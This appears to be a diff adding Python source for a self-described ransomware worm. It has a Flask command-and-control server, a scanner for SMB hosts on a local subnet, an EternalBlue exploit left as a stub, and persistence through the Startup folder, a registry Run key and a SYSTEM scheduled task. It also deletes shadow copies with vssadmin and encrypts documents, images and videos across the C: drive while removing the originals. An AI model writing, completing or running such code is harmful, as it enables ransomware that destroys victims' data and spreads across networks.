@@ -1,0 +1,177 @@
+import socket
+import os
+import shutil
+import subprocess
+import time
+import random
+import base64
+from threading import Thread
+from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
+import ctypes
+import concurrent.futures
+from flask import Flask, request
+
+# C2 Server Setup (simple HTTP server)
+app = Flask(__name__)
+
+@app.route('/status', methods=['POST'])
+def status():
+    data = request.json
+    print(f"[+] Status from {data['ip']}: {data['status']}")
+    return "OK"
+
+@app.route('/command', methods=['GET'])
+def command():
+    return "update"  # Placeholder for commands
+
+def run_c2_server():
+    app.run(host='0.0.0.0', port=8080)
+
+# Start C2 in background
+Thread(target=run_c2_server).start()
+
+# Worm config
+WORM_NAME = "update_patch.exe"
+NETWORK_RANGE = "192.168.1.0/24"
+TARGET_PORTS = [445]
+RANSOM_KEY = Fernet.generate_key()
+
+# Real EternalBlue exploit (placeholder—replace with full code)
+def eternalblue_exploit(ip, payload):
+    print(f"[+] Exploiting {ip} with EternalBlue...")
+    # Full exploit code goes here (e.g., from GitHub)
+    return True
+
+# Polymorphic obfuscation
+def obfuscate_code(code):
+    new_code = code.replace("WORM_NAME", f"VAR_{random.randint(1000,9999)}")
+    new_code += "\n# Junk " + str(random.randint(1000,9999))
+    return new_code
+
+# Pack with UPX
+def pack_with_upx(exe_path):
+    try:
+        subprocess.run(f"upx -9 {exe_path}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[+] Packed with UPX!")
+    except:
+        print("[-] UPX failed—still rolling!")
+
+# Process hollowing
+def process_hollowing(target_process, payload):
+    print(f"[+] Injecting into {target_process}...")
+    # Placeholder—use ctypes for CreateProcess, WriteProcessMemory, etc.
+    return True
+
+# Hide files/processes
+def hide_files_and_processes():
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(WORM_NAME, 2)  # Hidden
+        print("[+] Files hidden!")
+    except:
+        print("[-] Hiding failed—oh well!")
+
+# Persistence
+def make_persistent():
+    try:
+        # Startup folder
+        startup_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+        shutil.copyfile(os.path.abspath(WORM_NAME), startup_path + WORM_NAME)
+        
+        # Registry
+        cmd = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Omega /t REG_SZ /d "{os.path.abspath(WORM_NAME)}" /f'
+        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Scheduled task
+        task_cmd = f'schtasks /create /tn "OmegaUpdate" /tr "{os.path.abspath(WORM_NAME)}" /sc onstart /ru system'
+        subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        print("[+] Persistence set!")
+    except:
+        print("[-] Persistence failed—next!")
+
+# Watchdog
+def watchdog():
+    while True:
+        try:
+            subprocess.run(WORM_NAME, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+        time.sleep(60)
+
+# Ransomware payload
+def execute_payload():
+    try:
+        # Delete shadow copies
+        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Encrypt files
+        for root, dirs, files in os.walk("C:\\"):
+            for file in files:
+                if file.endswith((".docx", ".pdf", ".jpg", ".xlsx", ".pptx", ".txt", ".png", ".mp4")):
+                    encrypt_file(os.path.join(root, file))
+        
+        print("[+] Payload executed—files fucked!")
+    except Exception as e:
+        print(f"[-] Payload error: {e}")
+
+# Encrypt file
+def encrypt_file(file_path):
+    try:
+        fernet = Fernet(RANSOM_KEY)
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        encrypted_data = fernet.encrypt(file_data)
+        with open(file_path + ".omega", "wb") as file:
+            file.write(encrypted_data)
+        os.remove(file_path)
+    except:
+        pass
+
+# Multi-threaded scanning
+def scan_network():
+    print("[+] Scanning network!")
+    ip_base = NETWORK_RANGE.split("/")[0].rsplit(".", 1)[0]
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        for i in range(1, 255):
+            ip = f"{ip_base}.{i}"
+            executor.submit(check_host, ip)
+
+# Check host
+def check_host(ip):
+    for port in TARGET_PORTS:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip, port))
+        if result == 0:
+            print(f"[+] Target at {ip}:{port}!")
+            infect_host(ip)
+        sock.close()
+
+# Infect host
+def infect_host(ip):
+    try:
+        if eternalblue_exploit(ip, base64.b64encode(open(WORM_NAME, "rb").read())):
+            print(f"[+] {ip} infected!")
+            spread_from_host(ip)
+    except Exception as e:
+        print(f"[-] Infection failed: {e}")
+
+# Spread from host
+def spread_from_host(ip):
+    try:
+        print(f"[+] Spreading from {ip}!")
+    except:
+        print(f"[-] Spread failed—next!")
+
+# Main
+def main():
+    print("[+] Worm’s alive—let’s roll!")
+    hide_files_and_processes()
+    make_persistent()
+    Thread(target=watchdog).start()
+    execute_payload()
+    scan_network()
+
+if __name__ == "__main__":
+    main()
